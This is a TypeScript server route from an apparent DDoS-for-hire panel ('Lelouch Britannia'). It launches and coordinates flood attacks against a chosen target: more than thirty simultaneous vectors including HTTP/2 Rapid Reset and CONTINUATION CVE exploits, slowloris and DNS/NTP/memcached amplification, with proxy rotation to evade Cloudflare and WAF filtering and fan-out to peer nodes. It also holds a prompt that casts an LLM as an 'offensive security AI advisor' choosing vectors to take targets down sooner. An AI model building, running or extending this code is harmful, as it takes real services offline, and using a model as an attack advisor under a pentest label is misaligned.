/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { attackLimiter } from "../middlewares/rateLimit.js";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";
import { CLUSTER_NODES } from "./cluster.js";

// ── Cluster fan-out — fires geass-override to all peer nodes (fire & forget) ─
function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
  if (CLUSTER_NODES.length === 0) return;
  for (const nodeUrl of CLUSTER_NODES) {
    void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ target, port, method, duration, threads }),
      signal:  AbortSignal.timeout(8000),
    }).catch(() => { /* peer may be unreachable — ignore */ });
  }
}

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── Attack end-time tracking — used to correctly compute remaining time on Extend ──
// Stores absolute epoch-ms when each attack is scheduled to stop.
const attackEndTimes = new Map<number, number>();

// ── In-memory live stats (no DB latency) ───────────────────────────────────
// Accumulated since attack start — never reset until attack ends
const livePackets   = new Map<number, number>(); // total packets in memory
const liveBytes     = new Map<number, number>(); // total bytes in memory
// Snapshot from last rate window (updated every 1s by the rate timer)
const livePps       = new Map<number, number>(); // current pps
const liveBps       = new Map<number, number>(); // current bps
// Previous snapshot for delta calculation
const prevPktsSnap  = new Map<number, number>();
const prevBytesSnap = new Map<number, number>();
// Ring buffer of last 60 samples per attack: { t, pps, bps, conns }
interface TimeseriesSample { t: number; pps: number; bps: number; conns: number }
const liveTimeseries = new Map<number, TimeseriesSample[]>();
const TIMESERIES_MAX = 60;

// ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
// Prevents ~140 concurrent DB writes/s during Geass Override (21+ vectors × 300ms flush)
const dbBatchPkts  = new Map<number, number>();
const dbBatchBytes = new Map<number, number>();

setInterval(async () => {
  if (dbBatchPkts.size === 0) return;
  const entries       = [...dbBatchPkts.entries()];
  const bytesSnapshot = new Map(dbBatchBytes);   // snapshot BEFORE clear
  dbBatchPkts.clear();
  dbBatchBytes.clear();
  for (const [id, pkts] of entries) {
    const bytes = bytesSnapshot.get(id) ?? 0;
    void addStats(id, pkts, bytes);
  }
}, 500);

// Rate calculator — updates pps/bps from in-memory totals every second
setInterval(() => {
  for (const [id, total] of livePackets.entries()) {
    const prev  = prevPktsSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevPktsSnap.set(id, total);
    livePps.set(id, delta);
  }
  for (const [id, total] of liveBytes.entries()) {
    const prev  = prevBytesSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevBytesSnap.set(id, total);
    liveBps.set(id, delta);
  }
  // Push timeseries sample for every running attack
  const now = Date.now();
  for (const id of attackAborts.keys()) {
    let series = liveTimeseries.get(id);
    if (!series) { series = []; liveTimeseries.set(id, series); }
    series.push({
      t:     now,
      pps:   livePps.get(id) ?? 0,
      bps:   liveBps.get(id) ?? 0,
      conns: attackLiveConns.get(id) ?? 0,
    });
    if (series.length > TIMESERIES_MAX) series.shift();
  }
}, 1000);

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── OOM Guard — cap workers per pool in dev to prevent container kill ──────
// Replit dev containers: ~2GB RAM shared. Each worker_thread = ~60-80MB baseline.
// 33 geass-override pools × 8 workers × 60MB = 15GB peak → instant OOM kill.
// DETECTION: REPLIT_DEPLOYMENT is set ONLY in deployed (production) containers.
//            In dev workspaces it is absent regardless of NODE_ENV.
// In deployed: REPLIT_DEPLOYMENT=1 → no cap (dedicated resources, full power).
// In dev:      absent → cap at 1 worker/pool → 33 workers × 60MB = ~2GB max.
const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 1;

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
  try {
    const payload = {
      event,
      attack,
      timestamp: new Date().toISOString(),
      embeds: [{
        title: event === "target_down" ? "🔴 TARGET DOWN — LELOUCH BRITANNIA" : "✅ ATTACK FINISHED — LELOUCH BRITANNIA",
        description: event === "target_down"
          ? `Target **${attack.target}** confirmed OFFLINE`
          : `Attack against **${attack.target}** has completed`,
        color: event === "target_down" ? 0xFF0000 : 0x00FF41,
        fields: [
          { name: "Target",       value: attack.target,              inline: true },
          { name: "Method",       value: attack.method,              inline: true },
          { name: "Duration",     value: `${attack.duration}s`,      inline: true },
          { name: "Packets Sent", value: String(attack.packetsSent), inline: true },
          { name: "Bytes Sent",   value: String(attack.bytesSent),   inline: true },
          { name: "Status",       value: attack.status,              inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Lelouch Britannia — ARES OMNIVECT ∞" },
      }],
    };
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── Kill webhook: fire when target confirmed down (called from panel /api/notify) ──
// ── Scheduled attacks — in-memory queue with 10s polling ──────────────────
interface ScheduledAttack {
  id: string; target: string; port: number; method: string;
  duration: number; threads: number; webhookUrl?: string;
  scheduledFor: number; createdAt: number;
}
const scheduledAttacks = new Map<string, ScheduledAttack>();

// Poll every 10s — fire scheduled attacks that are due
setInterval(async () => {
  const now = Date.now();
  for (const [sid, sa] of scheduledAttacks.entries()) {
    if (now >= sa.scheduledFor) {
      scheduledAttacks.delete(sid);
      try {
        await fetch(`http://127.0.0.1:${process.env.PORT ?? 8080}/api/attacks`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target: sa.target, port: sa.port, method: sa.method,
            duration: sa.duration, threads: sa.threads, webhookUrl: sa.webhookUrl,
          }),
          signal: AbortSignal.timeout(8000),
        });
      } catch { /* ignore — server may be starting */ }
    }
  }
}, 10_000);

// ── AI Advisor — live Groq-powered tactical analysis ──────────────────────
const GROQ_SYSTEM = `You are an elite offensive security AI advisor for a penetration testing platform called "Lelouch Britannia". Analyze live attack metrics and return ONLY a valid JSON object. No markdown, no explanation, no code fences.`;

/** Safely parse Groq response — strips markdown fences and finds first JSON block */
function parseGroqJSON(raw: string): Record<string, unknown> {
  // Strip markdown code fences (```json ... ```)
  let s = raw.replace(/^```(?:json)?\s*/im, "").replace(/\s*```\s*$/im, "").trim();
  // Find first complete { ... } block in case of leading/trailing text
  const a = s.indexOf("{"); const b = s.lastIndexOf("}");
  if (a !== -1 && b !== -1 && b > a) s = s.slice(a, b + 1);
  try { return JSON.parse(s); }
  catch { return { analysis: raw.length > 0 ? raw : "No analysis available." }; }
}
async function groqAdvisor(attack: typeof attacksTable.$inferSelect, pps: number, bps: number, conns: number, targetStatus: string, targetLatencyMs: number): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  const msg = `LIVE METRICS — Target:${attack.target} Method:${attack.method} PPS:${pps} BPS:${bps} Conns:${conns} HTTP:${targetStatus} Latency:${targetLatencyMs}ms

Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read

Respond with JSON: {"analysis":"brief tactical assessment","primaryRecommendation":"specific next action","boostVector":"method_name","reduceVector":"method_name or null","severity":"low|medium|high|critical","estimatedDownIn":"time estimate or null","tip":"one advanced tip","effectiveness":0-100}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// ── Standalone AI Advisor (no attack required) — probe + analyse ──────────
async function groqAdvisorTarget(target: string): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  // Quick probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const url = target.startsWith("http") ? target : `https://${target}/`;
    const pr = await fetch(url, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  const msg = `PRE-ATTACK RECON — Target:${target} HTTP:${targetStatus} Latency:${targetLatencyMs}ms
Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read
Respond with JSON: {"analysis":"brief target assessment","primaryRecommendation":"best starting vector","boostVector":"method_name","severity":"low|medium|high|critical","estimatedDownIn":"rough estimate","tip":"one advanced tip","effectiveness":0-100,"targetStatus":"${targetStatus}","latencyMs":${targetLatencyMs}}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// GET /api/advisor?target=<url>  — standalone AI advisory (no active attack needed)
router.get("/advisor", async (req, res): Promise<void> => {
  const target = String(req.query.target ?? "").trim();
  if (!target) { res.status(400).json({ error: "target query param required" }); return; }
  try {
    const advice = await groqAdvisorTarget(target);
    res.json(advice);
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── DB stats accumulator ──────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ── Worker stats handler: update in-memory live stats + batch for DB ───────
function onWorkerStats(id: number, pkts: number, bytes: number, conns?: number) {
  // In-memory totals — instant, no DB lag
  livePackets.set(id, (livePackets.get(id) ?? 0) + pkts);
  liveBytes.set(id,   (liveBytes.get(id)   ?? 0) + bytes);
  // Queue for batched DB write (flushed every 500ms)
  dbBatchPkts.set(id,  (dbBatchPkts.get(id)  ?? 0) + pkts);
  dbBatchBytes.set(id, (dbBatchBytes.get(id) ?? 0) + bytes);
  // Live connection counter
  if (conns !== undefined) attackLiveConns.set(id, conns);
}


// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set([
  // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
  "http-flood", "http-bypass", "http-pipeline",
  // L7 application-layer attacks — proxy-aware
  "graphql-dos", "cache-poison", "rudy-v2",
  // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
  "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
  "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
  // New ARES OMNIVECT ∞ vectors — all L7, benefit from IP rotation
  "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
  "http-smuggling", "doh-flood", "keepalive-exhaust",
  "app-smart-flood", "large-header-bomb", "http2-priority-storm",
  // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst",
  "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // Apply OOM guard — cap workers in dev to prevent container kill
  numWorkers = Math.min(numWorkers, MAX_WORKERS_PER_POOL);
  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
  // CRITICAL: include username/password so authenticated proxies (residential) work in workers
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined, username: p.username, password: p.password }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };

    for (let i = 0; i < numWorkers; i++) {
      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // Always cap worker heap — prevents OS-level OOM kill on deployed containers.
      // Production: 512MB per worker keeps total under container limit.
      // Dev: 256MB to avoid local OOM on smaller machines.
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies },
        resourceLimits: { maxOldGenerationSizeMb: process.env.NODE_ENV === "production" ? 512 : 256 },
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number }) => {
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
  // quic-flood is also UDP-based (port 443/UDP)
  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
  const UDP_METHODS = new Set([
    "udp-flood", "udp-bypass", "quic-flood",
    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
  ]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: ARES OMNIVECT ∞ — ABSOLUTE TOTAL DEVASTATION ────────
  // ★ 30 SIMULTANEOUS ATTACK VECTORS — 32GB/8vCPU OPTIMIZED ★
  //
  // Layer 7 — Application (12 vectors):
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 1000-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
  // Vector 11: HTTP Bypass             — Chrome fingerprint + proxy rotation, bypasses CDN/WAF per-IP
  // Vector 12: Keepalive Exhaust       — pipeline 128 reqs/conn, holds server worker threads [NEW]
  //
  // Layer 7 — Advanced HTTP/2 (4 vectors):
  // Vector 13: H2 Settings Storm       — SETTINGS oscillation + WINDOW_UPDATE: 326K pps proved
  // Vector 14: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, no wait
  // Vector 15: H2 PING Storm           — thousands of PING frames/s, server must ACK every one [NEW]
  // Vector 16: HTTP Smuggling          — TE/CL desync, poisons backend request queue [NEW]
  //
  // TLS / Crypto (3 vectors):
  // Vector 17: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
  // Vector 18: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  // Vector 19: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  //
  // Application Layer — Extended (3 vectors):
  // Vector 20: XML Bomb                — billion-laughs entity expansion to XML/SOAP endpoints [NEW]
  // Vector 21: Slow Read               — pause TCP read, fills server send buffer, thread blocked [NEW]
  // Vector 22: HTTP Range Flood        — Range: 500 × 1-byte ranges, 500× server I/O per req [NEW]
  //
  // Layer 4 — Transport (1 vector):
  // Vector 23: SYN Flood               — pure TCP SYN_RECV table exhaustion before handshake
  //
  // Layer 3 — Network/Amplification (5 vectors):
  // Vector 24: ICMP Flood              — real ICMP echo, raw-socket/hping3/UDP fallback, L3 saturation
  // Vector 25: DNS Water Torture       — floods NS servers, bypasses CDN/WAF, fills NXDOMAIN cache
  // Vector 26: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests
  // Vector 27: Memcached UDP Flood     — real binary Memcached protocol to port 11211
  // Vector 28: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
  //
  // UDP / Volumetric (2 vectors):
  // Vector 29: UDP Flood               — raw UDP burst engine, 500K pps per worker
  // Vector 30: DNS over HTTPS Flood    — random DNS queries to /dns-query, forces recursive lookup [NEW]
  //
  // ★ ADAPTIVE BURST MODE: after 30s, top 5 vectors auto-spike to +50% threads for 10s waves
  // ★ WORKER SCALING: I/O-bound vectors → 2× CPU_COUNT workers each
  if (method === "geass-override") {
    // ── Worker counts — calibrated for stable deployment containers (4-8GB RAM) ──
    // slowloris/conn-flood each hold thousands of persistent TLS sockets → 1 worker each
    // HTTP/H2 workers are stateless (fast req/response) → scale with CPU_COUNT
    const connW    = 1;                               // 1× conn-flood (12K persistent TLS sockets each)
    const slowW    = 1;                               // 1× slowloris  (15K persistent TLS sockets each)
    const h2W      = Math.max(6, CPU_COUNT);          // ≥6 — CVE-2023-44487 (stateless, scales well)
    const contW    = Math.max(4, Math.floor(CPU_COUNT * 0.75)); // ≥4 — CVE-2024-27316 OOM
    const hpackW   = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — HPACK eviction
    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome fingerprint
    const wsW      = 1;                               // 1× WS exhaust (5K persistent WS sockets each)
    const gqlW     = 2;                               // 2× GraphQL exponential
    const rudyW    = 1;                               // 1× multipart slow POST (persistent)
    const cacheW   = 2;                               // 2× CDN cache eviction
    const tlsW     = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — RSA renegotiation CPU
    const quicW    = 1;                               // 1× QUIC/H3 UDP
    const sslW     = 2;                               // 2× SSL Death Record
    const stormW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — H2 Settings Storm
    const pipeW    = Math.max(6, CPU_COUNT);          // ≥6 — HTTP Pipeline (stateless, high throughput)
    const bypassW  = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Chrome bypass
    const kaW      = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Keepalive exhaust
    const pingW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PING storm
    const smugW    = 2;                               // 2× HTTP smuggling
    const xmlW     = 1;                               // 1× XML bomb (CPU-bound, 1 is enough)
    const slowRW   = 1;                               // 1× Slow Read (persistent connections)
    const rangeW   = 2;                               // 2× Range Flood
    const appW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — App Smart Flood
    const lhbW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Large Header Bomb
    const prioW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PRIORITY Storm
    const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
    // L3/UDP — single worker with high socket concurrency
    const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
    const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;

    // ── Thread budget v2 — re-calibrated April 2026 ─────────────────────────
    // Priority: H2 RST (CVE-2023-44487) → H2 Settings Storm → HTTP Pipeline
    // → HPACK Bomb → H2 CONTINUATION (CVE-2024-27316) → WAF Bypass → App Smart
    const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood (hold sockets)
    const slowT    = Math.max(200,  Math.round(threads * 0.10)); // slowloris (hold threads)
    const h2T      = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ CVE-2023-44487 RST — most impactful
    const contT    = Math.max(900,  Math.round(threads * 0.50)); // ★★★ CVE-2024-27316 OOM — many servers unpatched
    const hpackT   = Math.max(700,  Math.round(threads * 0.40)); // ★★★ HPACK eviction CPU storm
    const wafT     = Math.max(600,  Math.round(threads * 0.40)); // ★★★ Chrome fingerprint bypass
    const wsT      = Math.max(200,  Math.round(threads * 0.10)); // WS goroutine exhaust
    const gqlT     = Math.max(100,  Math.round(threads * 0.07)); // GraphQL resolver explosion
    const udpT     = Math.max(150,  Math.round(threads * 0.08)); // UDP bandwidth
    const rudyT    = Math.max(100,  Math.round(threads * 0.09)); // RUDY slow POST
    const cacheT   = Math.max(100,  Math.round(threads * 0.07)); // CDN cache eviction
    const tlsT     = Math.max(100,  Math.round(threads * 0.07)); // TLS RSA renegotiation
    const quicT    = Math.max(80,   Math.round(threads * 0.05)); // QUIC state alloc
    const sslT     = Math.max(200,  Math.round(threads * 0.10)); // SSL Death Record (1-byte TLS)
    const stormT   = Math.max(1000, Math.round(threads * 0.58)); // ★★★★ H2 Settings Storm — nginx killer
    const pipeT    = Math.max(1800, Math.round(threads * 0.82)); // ★★★★ HTTP/1.1 Pipeline — saturates keep-alive pool
    const bypassT  = Math.max(300,  Math.round(threads * 0.22)); // Chrome L7 bypass
    const kaT      = Math.max(200,  Math.round(threads * 0.15)); // Keepalive exhaustion
    const pingT    = Math.max(500,  Math.round(threads * 0.32)); // ★★★ H2 PING storm (WINDOW_UPDATE flood)
    const smugT    = Math.max(100,  Math.round(threads * 0.10)); // HTTP request smuggling
    const xmlT     = Math.max(80,   Math.round(threads * 0.06)); // XML billion-laughs
    const slowRT   = Math.max(100,  Math.round(threads * 0.09)); // Slow Read TCP window
    const rangeT   = Math.max(150,  Math.round(threads * 0.12)); // HTTP Range I/O amplification
    const synT     = Math.max(400,  Math.round(threads * 0.15)); // SYN flood
    // L3/UDP — each gets its own high-throughput socket pool
    const icmpT    = Math.max(400,  Math.round(threads * 0.15)); // ICMP echo flood
    const dnsT     = Math.max(500,  Math.round(threads * 0.12)); // DNS Water Torture (NS servers)
    const ntpT     = Math.max(400,  Math.round(threads * 0.09)); // NTP mode 7 monlist
    const memT     = Math.max(200,  Math.round(threads * 0.07)); // Memcached binary UDP
    const ssdpT    = Math.max(200,  Math.round(threads * 0.07)); // SSDP M-SEARCH UPnP
    const dohT     = Math.max(100,  Math.round(threads * 0.06)); // DoH recursive flood
    const appT     = Math.max(600,  Math.round(threads * 0.35)); // ★★★ App Smart Flood (session-aware)
    const lhbT     = Math.max(500,  Math.round(threads * 0.28)); // ★★★ Large Header Bomb (header table OOM)
    const prioT    = Math.max(400,  Math.round(threads * 0.28)); // ★★★ H2 PRIORITY Storm (dep-tree CPU)

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    // ── Launch all 33 vectors simultaneously (ARES OMNIVECT ∞) ──────────────────
    const geassPromise = Promise.all([
      // L7 Application (12 vectors)
      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),
      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),
      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),
      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),
      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),
      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
      // L7 Advanced H2 (4 vectors)
      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
      // TLS / Crypto (3 vectors)
      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
      spawnPool("quic-flood",          target, port, quicT,   quicW,   signal, onStats),
      // Extended App — Tier 2 (5 vectors)
      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),                // [NEW 23]
      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),               // [NEW 24]
      // L7 H2 Priority (1 vector)
      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),               // [NEW 25]
      // L4 Transport (1 vector)
      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
      // L3 Network (5 vectors)
      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),
      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),
      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),
      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),
      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),
      // UDP / Volumetric (2 vectors)
      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
    ]); // Total: 33 ARES OMNIVECT ∞ vectors

    // ── ADAPTIVE BURST MODE ─────────────────────────────────────────────
    // After 30s: fires BURST WAVES alternating between H2/Pipeline-heavy and
    // App-layer-heavy waves — 15s on, 15s off, indefinitely.
    // Wave pattern: odd=H2 heavy (+80%), even=App heavy (+60%), 3rd=Max (+120%)
    // This overwhelms rate limiters tuned for steady-state traffic.
    const burstLoop = async () => {
      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for target to be probed
      let wave = 0;
      while (!signal.aborted) {
        wave++;
        const burstAbort = new AbortController();
        const burstTimer = setTimeout(() => burstAbort.abort(), 15_000);
